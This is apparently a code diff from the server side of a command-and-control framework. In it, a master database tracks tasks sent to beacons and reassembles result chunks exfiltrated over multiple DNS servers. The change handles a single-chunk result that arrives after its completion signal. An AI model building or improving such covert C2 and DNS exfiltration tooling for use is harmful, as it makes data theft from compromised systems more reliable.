@@ -1284,6 +1284,14 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 				fmt.Printf("[Master DB] Task %s status: sent → exfiltrating (first chunk received)\n", taskID)
 			}
 		}
+
+		// SHADOW MESH: If single-chunk result arrived AFTER RESULT_COMPLETE was received
+		// (task status is "exfiltrating" but completion was signaled from different DNS server)
+		// Mark task as completed now that we have the data
+		if err == nil && currentStatus == "exfiltrating" && chunkIndex == 1 && totalChunks == 1 {
+			fmt.Printf("[Master DB] Single-chunk result arrived after completion signal, marking complete now\n")
+			d.markTaskCompleted(taskID)
+		}
 	}
 
 	// NEW THREE-PHASE PROTOCOL: Do NOT mark task as completed here
@@ -3116,6 +3124,13 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 		`, taskID).Scan(&resultSize)
 
 		if err != nil {
+			// SHADOW MESH: If result not found, it may arrive later from another DNS server
+			// Don't fail - just log and wait for actual data to arrive
+			if err.Error() == "sql: no rows in result set" {
+				fmt.Printf("[Master DB] Task %s completion received but no result data yet (mesh routing - data coming from different DNS server)\n", taskID)
+				// Leave task in "exfiltrating" status - will be completed when data arrives
+				return nil
+			}
 			return fmt.Errorf("failed to verify single-chunk result: %w", err)
 		}
 
